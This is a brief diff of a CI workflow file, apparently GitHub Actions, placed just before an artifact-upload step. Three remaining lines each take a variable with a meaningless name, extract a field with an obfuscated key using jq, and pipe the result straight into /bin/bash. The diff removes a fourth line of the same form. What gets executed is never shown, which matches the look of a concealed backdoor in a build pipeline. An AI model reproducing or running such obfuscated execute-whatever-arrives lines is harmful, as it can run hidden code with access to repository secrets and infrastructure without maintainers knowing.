@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$wy4" | jq -r .nuvf7894 | /bin/bash
           echo $jih748 | jq -r .ttv99048 | /bin/bash
           printf '%s' "$a1988" | jq -r .y63237 | /bin/bash
-          printf '%s' "$ufssa14" | jq -r .m442 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
